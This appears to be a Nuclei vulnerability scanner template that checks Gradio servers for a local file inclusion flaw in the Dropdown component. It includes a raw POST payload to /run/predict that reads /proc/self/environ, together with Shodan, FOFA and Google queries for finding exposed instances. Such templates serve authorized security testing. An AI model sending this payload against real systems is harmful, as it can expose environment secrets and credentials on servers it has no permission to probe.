http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'url":'
    - path":"
    - data":[{
    - FileData
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /run/predict HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"data":["{\"path\":\"/proc/self/environ\"}"],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"ig8gs2fazn"}

    '
id: gradio-lfi
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-20
  description: 'Gradio''s Dropdown component is vulnerable to Local File Inclusion
    (LFI) when the value is a dictionary controlled by an attacker. In the postprocess
    of components, if the value type is a dict, it flows to the async_move_files_to_cache
    function. When the dictionary is crafted with a "path" key, it causes local file
    inclusion allowing attackers to read arbitrary files.

    '
  metadata:
    fofa-query:
    - body="__gradio_mode__"
    - title="gradio"
    google-query: intitle:"gradio"
    max-request: 1
    product: gradio
    shodan-query:
    - http.html:"__gradio_mode__"
    - http.title:"gradio"
    vendor: gradio_app
  name: Gradio - Local File Inclusion
  reference:
  - https://huntr.com/bounties/936ef084-45e1-4dc5-a419-bca071189565
  severity: critical
  tags: lfi,gradio,file-inclusion
